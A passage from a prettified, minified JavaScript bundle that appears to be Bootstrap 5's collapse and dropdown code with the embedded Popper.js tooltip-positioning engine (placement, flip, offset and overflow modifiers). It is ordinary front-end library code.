                throw new TypeError('No method named "' + e + '"');
              i[e]();
            }
          }),
          (o.jQueryInterface = function (t) {
            return this.each(function () {
              o.collapseInterface(this, t);
            });
          }),
          e(o, null, [
            {
              key: "Default",
              get: function () {
                return G;
              },
            },
            {
              key: "DATA_KEY",
              get: function () {
                return "bs.collapse";
              },
            },
          ]),
          o
        );
      })(B);
    z.on(
      document,
      "click.bs.collapse.data-api",
      '[data-bs-toggle="collapse"]',
      function (t) {
        ("A" === t.target.tagName ||
          (t.delegateTarget && "A" === t.delegateTarget.tagName)) &&
          t.preventDefault();
        var e = q.getDataAttributes(this),
          n = l(this);
        F(n).forEach(function (t) {
          var n,
            i = E(t, "bs.collapse");
          i
            ? (null === i._parent &&
                "string" == typeof e.parent &&
                ((i._config.parent = e.parent), (i._parent = i._getParent())),
              (n = "toggle"))
            : (n = e),
            J.collapseInterface(t, n);
        });
      }
    ),
      _("collapse", J);
    var tt = "top",
      et = "bottom",
      nt = "right",
      it = "left",
      ot = [tt, et, nt, it],
      rt = ot.reduce(function (t, e) {
        return t.concat([e + "-start", e + "-end"]);
      }, []),
      st = [].concat(ot, ["auto"]).reduce(function (t, e) {
        return t.concat([e, e + "-start", e + "-end"]);
      }, []),
      at = [
        "beforeRead",
        "read",
        "afterRead",
        "beforeMain",
        "main",
        "afterMain",
        "beforeWrite",
        "write",
        "afterWrite",
      ];
    function lt(t) {
      return t ? (t.nodeName || "").toLowerCase() : null;
    }
    function ct(t) {
      if ("[object Window]" !== t.toString()) {
        var e = t.ownerDocument;
        return (e && e.defaultView) || window;
      }
      return t;
    }
    function ut(t) {
      return t instanceof ct(t).Element || t instanceof Element;
    }
    function dt(t) {
      return t instanceof ct(t).HTMLElement || t instanceof HTMLElement;
    }
    var ht = {
      name: "applyStyles",
      enabled: !0,
      phase: "write",
      fn: function (t) {
        var e = t.state;
        Object.keys(e.elements).forEach(function (t) {
          var n = e.styles[t] || {},
            i = e.attributes[t] || {},
            o = e.elements[t];
          dt(o) &&
            lt(o) &&
            (Object.assign(o.style, n),
            Object.keys(i).forEach(function (t) {
              var e = i[t];
              !1 === e
                ? o.removeAttribute(t)
                : o.setAttribute(t, !0 === e ? "" : e);
            }));
        });
      },
      effect: function (t) {
        var e = t.state,
          n = {
            popper: {
              position: e.options.strategy,
              left: "0",
              top: "0",
              margin: "0",
            },
            arrow: { position: "absolute" },
            reference: {},
          };
        return (
          Object.assign(e.elements.popper.style, n.popper),
          e.elements.arrow && Object.assign(e.elements.arrow.style, n.arrow),
          function () {
            Object.keys(e.elements).forEach(function (t) {
              var i = e.elements[t],
                o = e.attributes[t] || {},
                r = Object.keys(
                  e.styles.hasOwnProperty(t) ? e.styles[t] : n[t]
                ).reduce(function (t, e) {
                  return (t[e] = ""), t;
                }, {});
              dt(i) &&
                lt(i) &&
                (Object.assign(i.style, r),
                Object.keys(o).forEach(function (t) {
                  i.removeAttribute(t);
                }));
            });
          }
        );
      },
      requires: ["computeStyles"],
    };
    function ft(t) {
      return t.split("-")[0];
    }
    function pt(t) {
      return {
        x: t.offsetLeft,
        y: t.offsetTop,
        width: t.offsetWidth,
        height: t.offsetHeight,
      };
    }
    function gt(t, e) {
      var n,
        i = e.getRootNode && e.getRootNode();
      if (t.contains(e)) return !0;
      if (
        i &&
        ((n = i) instanceof ct(n).ShadowRoot || n instanceof ShadowRoot)
      ) {
        var o = e;
        do {
          if (o && t.isSameNode(o)) return !0;
          o = o.parentNode || o.host;
        } while (o);
      }
      return !1;
    }
    function mt(t) {
      return ct(t).getComputedStyle(t);
    }
    function vt(t) {
      return ["table", "td", "th"].indexOf(lt(t)) >= 0;
    }
    function yt(t) {
      return (
        (ut(t) ? t.ownerDocument : t.document) || window.document
      ).documentElement;
    }
    function bt(t) {
      return "html" === lt(t)
        ? t
        : t.assignedSlot || t.parentNode || t.host || yt(t);
    }
    function _t(t) {
      if (!dt(t) || "fixed" === mt(t).position) return null;
      var e = t.offsetParent;
      if (e) {
        var n = yt(e);
        if (
          "body" === lt(e) &&
          "static" === mt(e).position &&
          "static" !== mt(n).position
        )
          return n;
      }
      return e;
    }
    function wt(t) {
      for (
        var e = ct(t), n = _t(t);
        n && vt(n) && "static" === mt(n).position;

      )
        n = _t(n);
      return n && "body" === lt(n) && "static" === mt(n).position
        ? e
        : n ||
            (function (t) {
              for (
                var e = bt(t);
                dt(e) && ["html", "body"].indexOf(lt(e)) < 0;

              ) {
                var n = mt(e);
                if (
                  "none" !== n.transform ||
                  "none" !== n.perspective ||
                  (n.willChange && "auto" !== n.willChange)
                )
                  return e;
                e = e.parentNode;
              }
              return null;
            })(t) ||
            e;
    }
    function xt(t) {
      return ["top", "bottom"].indexOf(t) >= 0 ? "x" : "y";
    }
    function Et(t, e, n) {
      return Math.max(t, Math.min(e, n));
    }
    function Tt(t) {
      return Object.assign(
        Object.assign({}, { top: 0, right: 0, bottom: 0, left: 0 }),
        t
      );
    }
    function Ct(t, e) {
      return e.reduce(function (e, n) {
        return (e[n] = t), e;
      }, {});
    }
    var At = {
        name: "arrow",
        enabled: !0,
        phase: "main",
        fn: function (t) {
          var e,
            n = t.state,
            i = t.name,
            o = n.elements.arrow,
            r = n.modifiersData.popperOffsets,
            s = ft(n.placement),
            a = xt(s),
            l = [it, nt].indexOf(s) >= 0 ? "height" : "width";
          if (o && r) {
            var c = n.modifiersData[i + "#persistent"].padding,
              u = pt(o),
              d = "y" === a ? tt : it,
              h = "y" === a ? et : nt,
              f =
                n.rects.reference[l] +
                n.rects.reference[a] -
                r[a] -
                n.rects.popper[l],
              p = r[a] - n.rects.reference[a],
              g = wt(o),
              m = g
                ? "y" === a
                  ? g.clientHeight || 0
                  : g.clientWidth || 0
                : 0,
              v = f / 2 - p / 2,
              y = c[d],
              b = m - u[l] - c[h],
              _ = m / 2 - u[l] / 2 + v,
              w = Et(y, _, b),
              x = a;
            n.modifiersData[i] =
              (((e = {})[x] = w), (e.centerOffset = w - _), e);
          }
        },
        effect: function (t) {
          var e = t.state,
            n = t.options,
            i = t.name,
            o = n.element,
            r = void 0 === o ? "[data-popper-arrow]" : o,
            s = n.padding,
            a = void 0 === s ? 0 : s;
          null != r &&
            ("string" != typeof r ||
              (r = e.elements.popper.querySelector(r))) &&
            gt(e.elements.popper, r) &&
            ((e.elements.arrow = r),
            (e.modifiersData[i + "#persistent"] = {
              padding: Tt("number" != typeof a ? a : Ct(a, ot)),
            }));
        },
        requires: ["popperOffsets"],
        requiresIfExists: ["preventOverflow"],
      },
      kt = { top: "auto", right: "auto", bottom: "auto", left: "auto" };
    function St(t) {
      var e,
        n = t.popper,
        i = t.popperRect,
        o = t.placement,
        r = t.offsets,
        s = t.position,
        a = t.gpuAcceleration,
        l = t.adaptive,
        c = t.roundOffsets
          ? (function (t) {
              var e = t.x,
                n = t.y,
                i = window.devicePixelRatio || 1;
              return {
                x: Math.round(e * i) / i || 0,
                y: Math.round(n * i) / i || 0,
              };
            })(r)
          : r,
        u = c.x,
        d = void 0 === u ? 0 : u,
        h = c.y,
        f = void 0 === h ? 0 : h,
        p = r.hasOwnProperty("x"),
        g = r.hasOwnProperty("y"),
        m = it,
        v = tt,
        y = window;
      if (l) {
        var b = wt(n);
        b === ct(n) && (b = yt(n)),
          o === tt &&
            ((v = et), (f -= b.clientHeight - i.height), (f *= a ? 1 : -1)),
          o === it &&
            ((m = nt), (d -= b.clientWidth - i.width), (d *= a ? 1 : -1));
      }
      var _,
        w = Object.assign({ position: s }, l && kt);
      return a
        ? Object.assign(
            Object.assign({}, w),
            {},
            (((_ = {})[v] = g ? "0" : ""),
            (_[m] = p ? "0" : ""),
            (_.transform =
              (y.devicePixelRatio || 1) < 2
                ? "translate(" + d + "px, " + f + "px)"
                : "translate3d(" + d + "px, " + f + "px, 0)"),
            _)
          )
        : Object.assign(
            Object.assign({}, w),
            {},
            (((e = {})[v] = g ? f + "px" : ""),
            (e[m] = p ? d + "px" : ""),
            (e.transform = ""),
            e)
          );
    }
    var Lt = {
        name: "computeStyles",
        enabled: !0,
        phase: "beforeWrite",
        fn: function (t) {
          var e = t.state,
            n = t.options,
            i = n.gpuAcceleration,
            o = void 0 === i || i,
            r = n.adaptive,
            s = void 0 === r || r,
            a = n.roundOffsets,
            l = void 0 === a || a,
            c = {
              placement: ft(e.placement),
              popper: e.elements.popper,
              popperRect: e.rects.popper,
              gpuAcceleration: o,
            };
          null != e.modifiersData.popperOffsets &&
            (e.styles.popper = Object.assign(
              Object.assign({}, e.styles.popper),
              St(
                Object.assign(
                  Object.assign({}, c),
                  {},
                  {
                    offsets: e.modifiersData.popperOffsets,
                    position: e.options.strategy,
                    adaptive: s,
                    roundOffsets: l,
                  }
                )
              )
            )),
            null != e.modifiersData.arrow &&
              (e.styles.arrow = Object.assign(
                Object.assign({}, e.styles.arrow),
                St(
                  Object.assign(
                    Object.assign({}, c),
                    {},
                    {
                      offsets: e.modifiersData.arrow,
                      position: "absolute",
                      adaptive: !1,
                      roundOffsets: l,
                    }
                  )
                )
              )),
            (e.attributes.popper = Object.assign(
              Object.assign({}, e.attributes.popper),
              {},
              { "data-popper-placement": e.placement }
            ));
        },
        data: {},
      },
      Dt = { passive: !0 },
      Nt = {
        name: "eventListeners",
        enabled: !0,
        phase: "write",
        fn: function () {},
        effect: function (t) {
          var e = t.state,
            n = t.instance,
            i = t.options,
            o = i.scroll,
            r = void 0 === o || o,
            s = i.resize,
            a = void 0 === s || s,
            l = ct(e.elements.popper),
            c = [].concat(e.scrollParents.reference, e.scrollParents.popper);
          return (
            r &&
              c.forEach(function (t) {
                t.addEventListener("scroll", n.update, Dt);
              }),
            a && l.addEventListener("resize", n.update, Dt),
            function () {
              r &&
                c.forEach(function (t) {
                  t.removeEventListener("scroll", n.update, Dt);
                }),
                a && l.removeEventListener("resize", n.update, Dt);
            }
          );
        },
        data: {},
      },
      Ot = { left: "right", right: "left", bottom: "top", top: "bottom" };
    function jt(t) {
      return t.replace(/left|right|bottom|top/g, function (t) {
        return Ot[t];
      });
    }
    var Pt = { start: "end", end: "start" };
    function Ht(t) {
      return t.replace(/start|end/g, function (t) {
        return Pt[t];
      });
    }
    function Mt(t) {
      var e = t.getBoundingClientRect();
      return {
        width: e.width,
        height: e.height,
        top: e.top,
        right: e.right,
        bottom: e.bottom,
        left: e.left,
        x: e.left,
        y: e.top,
      };
    }
    function zt(t) {
      var e = ct(t);
      return { scrollLeft: e.pageXOffset, scrollTop: e.pageYOffset };
    }
    function Bt(t) {
      return Mt(yt(t)).left + zt(t).scrollLeft;
    }
    function It(t) {
      var e = mt(t),
        n = e.overflow,
        i = e.overflowX,
        o = e.overflowY;
      return /auto|scroll|overlay|hidden/.test(n + o + i);
    }
    function $t(t, e) {
      void 0 === e && (e = []);
      var n = (function t(e) {
          return ["html", "body", "#document"].indexOf(lt(e)) >= 0
            ? e.ownerDocument.body
            : dt(e) && It(e)
            ? e
            : t(bt(e));
        })(t),
        i = "body" === lt(n),
        o = ct(n),
        r = i ? [o].concat(o.visualViewport || [], It(n) ? n : []) : n,
        s = e.concat(r);
      return i ? s : s.concat($t(bt(r)));
    }
    function Rt(t) {
      return Object.assign(
        Object.assign({}, t),
        {},
        { left: t.x, top: t.y, right: t.x + t.width, bottom: t.y + t.height }
      );
    }
    function Wt(t, e) {
      return "viewport" === e
        ? Rt(
            (function (t) {
              var e = ct(t),
                n = yt(t),
                i = e.visualViewport,
                o = n.clientWidth,
                r = n.clientHeight,
                s = 0,
                a = 0;
              return (
                i &&
                  ((o = i.width),
                  (r = i.height),
                  /^((?!chrome|android).)*safari/i.test(navigator.userAgent) ||
                    ((s = i.offsetLeft), (a = i.offsetTop))),
                { width: o, height: r, x: s + Bt(t), y: a }
              );
            })(t)
          )
        : dt(e)
        ? (function (t) {
            var e = Mt(t);
            return (
              (e.top = e.top + t.clientTop),
              (e.left = e.left + t.clientLeft),
              (e.bottom = e.top + t.clientHeight),
              (e.right = e.left + t.clientWidth),
              (e.width = t.clientWidth),
              (e.height = t.clientHeight),
              (e.x = e.left),
              (e.y = e.top),
              e
            );
          })(e)
        : Rt(
            (function (t) {
              var e = yt(t),
                n = zt(t),
                i = t.ownerDocument.body,
                o = Math.max(
                  e.scrollWidth,
                  e.clientWidth,
                  i ? i.scrollWidth : 0,
                  i ? i.clientWidth : 0
                ),
                r = Math.max(
                  e.scrollHeight,
                  e.clientHeight,
                  i ? i.scrollHeight : 0,
                  i ? i.clientHeight : 0
                ),
                s = -n.scrollLeft + Bt(t),
                a = -n.scrollTop;
              return (
                "rtl" === mt(i || e).direction &&
                  (s += Math.max(e.clientWidth, i ? i.clientWidth : 0) - o),
                { width: o, height: r, x: s, y: a }
              );
            })(yt(t))
          );
    }
    function qt(t) {
      return t.split("-")[1];
    }
    function Ft(t) {
      var e,
        n = t.reference,
        i = t.element,
        o = t.placement,
        r = o ? ft(o) : null,
        s = o ? qt(o) : null,
        a = n.x + n.width / 2 - i.width / 2,
        l = n.y + n.height / 2 - i.height / 2;
      switch (r) {
        case tt:
          e = { x: a, y: n.y - i.height };
          break;
        case et:
          e = { x: a, y: n.y + n.height };
          break;
        case nt:
          e = { x: n.x + n.width, y: l };
          break;
        case it:
          e = { x: n.x - i.width, y: l };
          break;
        default:
          e = { x: n.x, y: n.y };
      }
      var c = r ? xt(r) : null;
      if (null != c) {
        var u = "y" === c ? "height" : "width";
        switch (s) {
          case "start":
            e[c] = e[c] - (n[u] / 2 - i[u] / 2);
            break;
          case "end":
            e[c] = e[c] + (n[u] / 2 - i[u] / 2);
        }
      }
      return e;
    }
    function Ut(t, e) {
      void 0 === e && (e = {});
      var n = e,
        i = n.placement,
        o = void 0 === i ? t.placement : i,
        r = n.boundary,
        s = void 0 === r ? "clippingParents" : r,
        a = n.rootBoundary,
        l = void 0 === a ? "viewport" : a,
        c = n.elementContext,
        u = void 0 === c ? "popper" : c,
        d = n.altBoundary,
        h = void 0 !== d && d,
        f = n.padding,
        p = void 0 === f ? 0 : f,
        g = Tt("number" != typeof p ? p : Ct(p, ot)),
        m = "popper" === u ? "reference" : "popper",
        v = t.elements.reference,
        y = t.rects.popper,
        b = t.elements[h ? m : u],
        _ = (function (t, e, n) {
          var i =
              "clippingParents" === e
                ? (function (t) {
                    var e = $t(bt(t)),
                      n =
                        ["absolute", "fixed"].indexOf(mt(t).position) >= 0 &&
                        dt(t)
                          ? wt(t)
                          : t;
                    return ut(n)
                      ? e.filter(function (t) {
                          return ut(t) && gt(t, n) && "body" !== lt(t);
                        })
                      : [];
                  })(t)
                : [].concat(e),
            o = [].concat(i, [n]),
            r = o[0],
            s = o.reduce(function (e, n) {
              var i = Wt(t, n);
              return (
                (e.top = Math.max(i.top, e.top)),
                (e.right = Math.min(i.right, e.right)),
                (e.bottom = Math.min(i.bottom, e.bottom)),
                (e.left = Math.max(i.left, e.left)),
                e
              );
            }, Wt(t, r));
          return (
            (s.width = s.right - s.left),
            (s.height = s.bottom - s.top),
            (s.x = s.left),
            (s.y = s.top),
            s
          );
        })(ut(b) ? b : b.contextElement || yt(t.elements.popper), s, l),
        w = Mt(v),
        x = Ft({
          reference: w,
          element: y,
          strategy: "absolute",
          placement: o,
        }),
        E = Rt(Object.assign(Object.assign({}, y), x)),
        T = "popper" === u ? E : w,
        C = {
          top: _.top - T.top + g.top,
          bottom: T.bottom - _.bottom + g.bottom,
          left: _.left - T.left + g.left,
          right: T.right - _.right + g.right,
        },
        A = t.modifiersData.offset;
      if ("popper" === u && A) {
        var k = A[o];
        Object.keys(C).forEach(function (t) {
          var e = [nt, et].indexOf(t) >= 0 ? 1 : -1,
            n = [tt, et].indexOf(t) >= 0 ? "y" : "x";
          C[t] += k[n] * e;
        });
      }
      return C;
    }
    var Xt = {
      name: "flip",
      enabled: !0,
      phase: "main",
      fn: function (t) {
        var e = t.state,
          n = t.options,
          i = t.name;
        if (!e.modifiersData[i]._skip) {
          for (
            var o = n.mainAxis,
              r = void 0 === o || o,
              s = n.altAxis,
              a = void 0 === s || s,
              l = n.fallbackPlacements,
              c = n.padding,
              u = n.boundary,
              d = n.rootBoundary,
              h = n.altBoundary,
              f = n.flipVariations,
              p = void 0 === f || f,
              g = n.allowedAutoPlacements,
              m = e.options.placement,
              v = ft(m),
              y =
                l ||
                (v !== m && p
                  ? (function (t) {
                      if ("auto" === ft(t)) return [];
                      var e = jt(t);
                      return [Ht(t), e, Ht(e)];
                    })(m)
                  : [jt(m)]),
              b = [m].concat(y).reduce(function (t, n) {
                return t.concat(
                  "auto" === ft(n)
                    ? (function (t, e) {
                        void 0 === e && (e = {});
                        var n = e,
                          i = n.placement,
                          o = n.boundary,
                          r = n.rootBoundary,
                          s = n.padding,
                          a = n.flipVariations,
                          l = n.allowedAutoPlacements,
                          c = void 0 === l ? st : l,
                          u = qt(i),
                          d = u
                            ? a
                              ? rt
                              : rt.filter(function (t) {
                                  return qt(t) === u;
                                })
                            : ot,
                          h = d.filter(function (t) {
                            return c.indexOf(t) >= 0;
                          });
                        0 === h.length && (h = d);
                        var f = h.reduce(function (e, n) {
                          return (
                            (e[n] = Ut(t, {
                              placement: n,
                              boundary: o,
                              rootBoundary: r,
                              padding: s,
                            })[ft(n)]),
                            e
                          );
                        }, {});
                        return Object.keys(f).sort(function (t, e) {
                          return f[t] - f[e];
                        });
                      })(e, {
                        placement: n,
                        boundary: u,
                        rootBoundary: d,
                        padding: c,
                        flipVariations: p,
                        allowedAutoPlacements: g,
                      })
                    : n
                );
              }, []),
              _ = e.rects.reference,
              w = e.rects.popper,
              x = new Map(),
              E = !0,
              T = b[0],
              C = 0;
            C < b.length;
            C++
          ) {
            var A = b[C],
              k = ft(A),
              S = "start" === qt(A),
              L = [tt, et].indexOf(k) >= 0,
              D = L ? "width" : "height",
              N = Ut(e, {
                placement: A,
                boundary: u,
                rootBoundary: d,
                altBoundary: h,
                padding: c,
              }),
              O = L ? (S ? nt : it) : S ? et : tt;
            _[D] > w[D] && (O = jt(O));
            var j = jt(O),
              P = [];
            if (
              (r && P.push(N[k] <= 0),
              a && P.push(N[O] <= 0, N[j] <= 0),
              P.every(function (t) {
                return t;
              }))
            ) {
              (T = A), (E = !1);
              break;
            }
            x.set(A, P);
          }
          if (E)
            for (
              var H = function (t) {
                  var e = b.find(function (e) {
                    var n = x.get(e);
                    if (n)
                      return n.slice(0, t).every(function (t) {
                        return t;
                      });
                  });
                  if (e) return (T = e), "break";
                },
                M = p ? 3 : 1;
              M > 0 && "break" !== H(M);
              M--
            );
          e.placement !== T &&
            ((e.modifiersData[i]._skip = !0),
            (e.placement = T),
            (e.reset = !0));
        }
      },
      requiresIfExists: ["offset"],
      data: { _skip: !1 },
    };
    function Vt(t, e, n) {
      return (
        void 0 === n && (n = { x: 0, y: 0 }),
        {
          top: t.top - e.height - n.y,
          right: t.right - e.width + n.x,
          bottom: t.bottom - e.height + n.y,
          left: t.left - e.width - n.x,
        }
      );
    }
    function Yt(t) {
      return [tt, nt, et, it].some(function (e) {
        return t[e] >= 0;
      });
    }
    var Kt = {
        name: "hide",
        enabled: !0,
        phase: "main",
        requiresIfExists: ["preventOverflow"],
        fn: function (t) {
          var e = t.state,
            n = t.name,
            i = e.rects.reference,
            o = e.rects.popper,
            r = e.modifiersData.preventOverflow,
            s = Ut(e, { elementContext: "reference" }),
            a = Ut(e, { altBoundary: !0 }),
            l = Vt(s, i),
            c = Vt(a, o, r),
            u = Yt(l),
            d = Yt(c);
          (e.modifiersData[n] = {
            referenceClippingOffsets: l,
            popperEscapeOffsets: c,
            isReferenceHidden: u,
            hasPopperEscaped: d,
          }),
            (e.attributes.popper = Object.assign(
              Object.assign({}, e.attributes.popper),
              {},
              { "data-popper-reference-hidden": u, "data-popper-escaped": d }
            ));
        },
      },
      Qt = {
        name: "offset",
        enabled: !0,
        phase: "main",
        requires: ["popperOffsets"],
        fn: function (t) {
          var e = t.state,
            n = t.options,
            i = t.name,
            o = n.offset,
            r = void 0 === o ? [0, 0] : o,
            s = st.reduce(function (t, n) {
              return (
                (t[n] = (function (t, e, n) {
                  var i = ft(t),
                    o = [it, tt].indexOf(i) >= 0 ? -1 : 1,
                    r =
                      "function" == typeof n
                        ? n(
                            Object.assign(
                              Object.assign({}, e),
                              {},
                              { placement: t }
                            )
                          )
                        : n,
                    s = r[0],
                    a = r[1];
                  return (
                    (s = s || 0),
                    (a = (a || 0) * o),
                    [it, nt].indexOf(i) >= 0 ? { x: a, y: s } : { x: s, y: a }
                  );
                })(n, e.rects, r)),
                t
              );
            }, {}),
            a = s[e.placement],
            l = a.x,
            c = a.y;
          null != e.modifiersData.popperOffsets &&
            ((e.modifiersData.popperOffsets.x += l),
            (e.modifiersData.popperOffsets.y += c)),
            (e.modifiersData[i] = s);
        },
      },
      Gt = {
        name: "popperOffsets",
        enabled: !0,
        phase: "read",
        fn: function (t) {
          var e = t.state,
            n = t.name;
          e.modifiersData[n] = Ft({
            reference: e.rects.reference,
            element: e.rects.popper,
            strategy: "absolute",
            placement: e.placement,
          });
        },
        data: {},
      },
      Zt = {
        name: "preventOverflow",
        enabled: !0,
        phase: "main",
        fn: function (t) {
          var e = t.state,
            n = t.options,
            i = t.name,
            o = n.mainAxis,
            r = void 0 === o || o,
            s = n.altAxis,
            a = void 0 !== s && s,
            l = n.boundary,
            c = n.rootBoundary,
            u = n.altBoundary,
            d = n.padding,
            h = n.tether,
            f = void 0 === h || h,
            p = n.tetherOffset,
            g = void 0 === p ? 0 : p,
            m = Ut(e, {
              boundary: l,
              rootBoundary: c,
              padding: d,
              altBoundary: u,
            }),
            v = ft(e.placement),
            y = qt(e.placement),
            b = !y,
            _ = xt(v),
            w = "x" === _ ? "y" : "x",
            x = e.modifiersData.popperOffsets,
            E = e.rects.reference,
            T = e.rects.popper,
            C =
              "function" == typeof g
                ? g(
                    Object.assign(
                      Object.assign({}, e.rects),
                      {},
                      { placement: e.placement }
                    )
                  )
                : g,
            A = { x: 0, y: 0 };
          if (x) {
            if (r) {
              var k = "y" === _ ? tt : it,
                S = "y" === _ ? et : nt,
                L = "y" === _ ? "height" : "width",
                D = x[_],
                N = x[_] + m[k],
                O = x[_] - m[S],
                j = f ? -T[L] / 2 : 0,
                P = "start" === y ? E[L] : T[L],
                H = "start" === y ? -T[L] : -E[L],
                M = e.elements.arrow,
                z = f && M ? pt(M) : { width: 0, height: 0 },
                B = e.modifiersData["arrow#persistent"]
                  ? e.modifiersData["arrow#persistent"].padding
                  : { top: 0, right: 0, bottom: 0, left: 0 },
                I = B[k],
                $ = B[S],
                R = Et(0, E[L], z[L]),
                W = b ? E[L] / 2 - j - R - I - C : P - R - I - C,
                q = b ? -E[L] / 2 + j + R + $ + C : H + R + $ + C,
                F = e.elements.arrow && wt(e.elements.arrow),
                U = F ? ("y" === _ ? F.clientTop || 0 : F.clientLeft || 0) : 0,
                X = e.modifiersData.offset
                  ? e.modifiersData.offset[e.placement][_]
                  : 0,
                V = x[_] + W - X - U,
                Y = x[_] + q - X,
                K = Et(f ? Math.min(N, V) : N, D, f ? Math.max(O, Y) : O);
              (x[_] = K), (A[_] = K - D);
            }
            if (a) {
              var Q = "x" === _ ? tt : it,
                G = "x" === _ ? et : nt,
                Z = x[w],
                J = Et(Z + m[Q], Z, Z - m[G]);
              (x[w] = J), (A[w] = J - Z);
            }
            e.modifiersData[i] = A;
          }
        },
        requiresIfExists: ["offset"],
      };
    function Jt(t, e, n) {
      void 0 === n && (n = !1);
      var i,
        o,
        r = yt(e),
        s = Mt(t),
        a = dt(e),
        l = { scrollLeft: 0, scrollTop: 0 },
        c = { x: 0, y: 0 };
      return (
        (a || (!a && !n)) &&
          (("body" !== lt(e) || It(r)) &&
            (l =
              (i = e) !== ct(i) && dt(i)
                ? { scrollLeft: (o = i).scrollLeft, scrollTop: o.scrollTop }
                : zt(i)),
          dt(e)
            ? (((c = Mt(e)).x += e.clientLeft), (c.y += e.clientTop))
            : r && (c.x = Bt(r))),
        {
          x: s.left + l.scrollLeft - c.x,
          y: s.top + l.scrollTop - c.y,
          width: s.width,
          height: s.height,
        }
      );
    }
    var te = { placement: "bottom", modifiers: [], strategy: "absolute" };
    function ee() {
      for (var t = arguments.length, e = new Array(t), n = 0; n < t; n++)
        e[n] = arguments[n];
      return !e.some(function (t) {
        return !(t && "function" == typeof t.getBoundingClientRect);
      });
    }
    function ne(t) {
      void 0 === t && (t = {});
      var e = t,
        n = e.defaultModifiers,
        i = void 0 === n ? [] : n,
        o = e.defaultOptions,
        r = void 0 === o ? te : o;
      return function (t, e, n) {
        void 0 === n && (n = r);
        var o,
          s,
          a = {
            placement: "bottom",
            orderedModifiers: [],
            options: Object.assign(Object.assign({}, te), r),
            modifiersData: {},
            elements: { reference: t, popper: e },
            attributes: {},
            styles: {},
          },
          l = [],
          c = !1,
          u = {
            state: a,
            setOptions: function (n) {
              d(),
                (a.options = Object.assign(
                  Object.assign(Object.assign({}, r), a.options),
                  n
                )),
                (a.scrollParents = {
                  reference: ut(t)
                    ? $t(t)
                    : t.contextElement
                    ? $t(t.contextElement)
                    : [],
                  popper: $t(e),
                });
              var o,
                s,
                c = (function (t) {
                  var e = (function (t) {
                    var e = new Map(),
                      n = new Set(),
                      i = [];
                    return (
                      t.forEach(function (t) {
                        e.set(t.name, t);
                      }),
                      t.forEach(function (t) {
                        n.has(t.name) ||
                          (function t(o) {
                            n.add(o.name),
                              []
                                .concat(
                                  o.requires || [],
                                  o.requiresIfExists || []
                                )
                                .forEach(function (i) {
                                  if (!n.has(i)) {
                                    var o = e.get(i);
                                    o && t(o);
                                  }
                                }),
                              i.push(o);
                          })(t);
                      }),
                      i
                    );
                  })(t);
                  return at.reduce(function (t, n) {
                    return t.concat(
                      e.filter(function (t) {
                        return t.phase === n;
                      })
                    );
                  }, []);
                })(
                  ((o = [].concat(i, a.options.modifiers)),
                  (s = o.reduce(function (t, e) {
                    var n = t[e.name];
                    return (
                      (t[e.name] = n
                        ? Object.assign(
                            Object.assign(Object.assign({}, n), e),
                            {},
                            {
                              options: Object.assign(
                                Object.assign({}, n.options),
                                e.options
                              ),
                              data: Object.assign(
                                Object.assign({}, n.data),
                                e.data
                              ),
                            }
                          )
                        : e),
                      t
                    );
                  }, {})),
                  Object.keys(s).map(function (t) {
                    return s[t];
                  }))
                );
              return (
                (a.orderedModifiers = c.filter(function (t) {
                  return t.enabled;
                })),
                a.orderedModifiers.forEach(function (t) {
                  var e = t.name,
                    n = t.options,
                    i = void 0 === n ? {} : n,
                    o = t.effect;
                  if ("function" == typeof o) {
                    var r = o({ state: a, name: e, instance: u, options: i });
                    l.push(r || function () {});
                  }
                }),
                u.update()
              );
            },
            forceUpdate: function () {
              if (!c) {
                var t = a.elements,
                  e = t.reference,
                  n = t.popper;
                if (ee(e, n)) {
                  (a.rects = {
                    reference: Jt(e, wt(n), "fixed" === a.options.strategy),
                    popper: pt(n),
                  }),
                    (a.reset = !1),
                    (a.placement = a.options.placement),
                    a.orderedModifiers.forEach(function (t) {
                      return (a.modifiersData[t.name] = Object.assign(
                        {},
                        t.data
                      ));
                    });
                  for (var i = 0; i < a.orderedModifiers.length; i++)
                    if (!0 !== a.reset) {
                      var o = a.orderedModifiers[i],
                        r = o.fn,
                        s = o.options,
                        l = void 0 === s ? {} : s,
                        d = o.name;
                      "function" == typeof r &&
                        (a =
                          r({ state: a, options: l, name: d, instance: u }) ||
                          a);
                    } else (a.reset = !1), (i = -1);
                }
              }
            },
            update:
              ((o = function () {
                return new Promise(function (t) {
                  u.forceUpdate(), t(a);
                });
              }),
              function () {
                return (
                  s ||
                    (s = new Promise(function (t) {
                      Promise.resolve().then(function () {
                        (s = void 0), t(o());
                      });
                    })),
                  s
                );
              }),
            destroy: function () {
              d(), (c = !0);
            },
          };
        if (!ee(t, e)) return u;
        function d() {
          l.forEach(function (t) {
            return t();
          }),
            (l = []);
        }
        return (
          u.setOptions(n).then(function (t) {
            !c && n.onFirstUpdate && n.onFirstUpdate(t);
          }),
          u
        );
      };
    }
    var ie = ne(),
      oe = ne({ defaultModifiers: [Nt, Gt, Lt, ht] }),
      re = ne({ defaultModifiers: [Nt, Gt, Lt, ht, Qt, Xt, Zt, At, Kt] }),
      se = Object.freeze({
        __proto__: null,
        popperGenerator: ne,
        detectOverflow: Ut,
        createPopperBase: ie,
        createPopper: re,
        createPopperLite: oe,
        top: tt,
        bottom: et,
        right: nt,
        left: it,
        auto: "auto",
        basePlacements: ot,
        start: "start",
        end: "end",
        clippingParents: "clippingParents",
        viewport: "viewport",
        popper: "popper",
        reference: "reference",
        variationPlacements: rt,
        placements: st,
        beforeRead: "beforeRead",
        read: "read",
        afterRead: "afterRead",
        beforeMain: "beforeMain",
        main: "main",
        afterMain: "afterMain",
        beforeWrite: "beforeWrite",
        write: "write",
        afterWrite: "afterWrite",
        modifierPhases: at,
        applyStyles: ht,
        arrow: At,
        computeStyles: Lt,
        eventListeners: Nt,
        flip: Xt,
        hide: Kt,
        offset: Qt,
        popperOffsets: Gt,
        preventOverflow: Zt,
      }),
      ae = new RegExp("ArrowUp|ArrowDown|Escape"),
      le = b ? "top-end" : "top-start",
      ce = b ? "top-start" : "top-end",
      ue = b ? "bottom-end" : "bottom-start",
      de = b ? "bottom-start" : "bottom-end",
      he = b ? "left-start" : "right-start",
      fe = b ? "right-start" : "left-start",
      pe = {
        offset: [0, 2],
        flip: !0,
        boundary: "clippingParents",
        reference: "toggle",
        display: "dynamic",
        popperConfig: null,
      },
      ge = {
        offset: "(array|string|function)",
        flip: "boolean",
        boundary: "(string|element)",
        reference: "(string|element|object)",
        display: "string",
        popperConfig: "(null|object|function)",
      },
      me = (function (t) {
        function o(e, n) {
          var i;
          return (
            ((i = t.call(this, e) || this)._popper = null),
